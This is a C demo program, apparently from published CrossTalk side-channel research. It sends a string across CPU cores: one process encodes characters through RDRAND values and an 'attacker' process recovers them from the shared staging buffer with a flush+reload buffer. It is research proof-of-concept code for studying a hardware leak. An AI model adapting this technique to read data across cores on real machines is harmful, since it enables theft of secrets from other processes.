#include "../primitives/basic_primitives.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include "utils.h"
#include <string.h>

#ifdef TSX_AVAILABLE
#define CYCLE_LENGTH (uint64_t)600000
#else
#define CYCLE_LENGTH (uint64_t)2000000
#endif
void attacker_write_char(int cpu) {
    set_processor_affinity(cpu);

    char *leak_candidate_string = sample_strings[rand() % sample_string_count];
    int leak_pos = 0, len = strlen(leak_candidate_string);
    printf("[\e[32mWRITER/VICTIM\e[39m] Writing '%s'\n", leak_candidate_string + 1);
    do {
        usleep(CYCLE_LENGTH);
        uint64_t random_number = 0;
        while (((char) random_number) != leak_candidate_string[leak_pos])
                asm volatile("rdrand %0":"=r"(random_number):);
    } while (leak_pos++ < len);
    while (1) asm volatile("rdrand %%rax":: :"rax");
}

void synchronize_timing_with_writer(void *mem) {
    char staging_buffer[65];
    vector_read(mem, REPS * 5, staging_buffer, 32, 33, 0);
    uint8_t random_number = (uint8_t) staging_buffer[32];
    uint8_t reference = random_number;
    while (random_number == reference) {
        usleep(1000);
        vector_read(mem, REPS * 5, staging_buffer, 32, 33, 0);
        random_number = (uint8_t) staging_buffer[32];
    }

}

void attacker_read_char(int cpu, void *mem) {
    set_processor_affinity(cpu);
    asm volatile("rdrand %%rax":: :"rax");
    char staging_buffer[65];
    staging_buffer[64] = 0;

    struct timespec spec;
    uint64_t t;
    printf("[\e[31mREADER/ATTACKER\e[39m] ");
#ifdef TSX_AVAILABLE
    synchronize_timing_with_writer(mem);
#endif
    clock_gettime(CLOCK_REALTIME, &spec);
    t = time_convert(&spec);
    while (1) {
        while (time_convert(&spec) - t < (CYCLE_LENGTH * (uint64_t) 1000)) {
            clock_gettime(CLOCK_REALTIME, &spec);
        }
        clock_gettime(CLOCK_REALTIME, &spec);
        t = time_convert(&spec);
        uint64_t random_number = 0;
        vector_read(mem, REPS * 5, staging_buffer, 32, 33, 0);
        random_number = (uint8_t) staging_buffer[32];
        if(random_number >= 128) break;
        printf("%c", (char) random_number);
        fflush(stdout);
    }
    printf("\nDone.\n");
}

int main(int argc, char **args) {
    printf("Demo 3: Transmitting strings across cores.\n\n");
    _page_size = getpagesize();
    get_same_core_cpus(&attacker_cpu1, &attacker_cpu2);
    offcore_cpu = attacker_cpu1 + 1;
    printf("Running attacker threads on CPU %d and %d.\nRunning victim on CPU %d.\n\n", attacker_cpu1, attacker_cpu2,
           offcore_cpu);
    fflush(stdout);
    time_t tm;
    time(&tm);
    srand(tm);
    uint8_t * mem = allocate_flush_reload_buffer();
    if(((int64_t)mem) <= (int64_t)0){
        printf("Mapping the reload buffer failed. Did you allocate some huge pages?\n");
        return 1;
    }
    crosstalk_init(argc, args);
    memset(vector_hits, 0, sizeof(vector_hits[0][0]) * 64 * 256);
    pid = fork();
    if (!pid) victim_cpuid(0xABCDEF, attacker_cpu2);
    pid2 = fork();
    if (!pid2) attacker_write_char(offcore_cpu);
    attacker_read_char(attacker_cpu1, mem);
    kill(pid2, SIGKILL);
    kill(pid, SIGKILL);
    munmap(mem - 1, _page_size * 257);
    usleep(10000);
    crosstalk_cleanup();
    return 0;
}

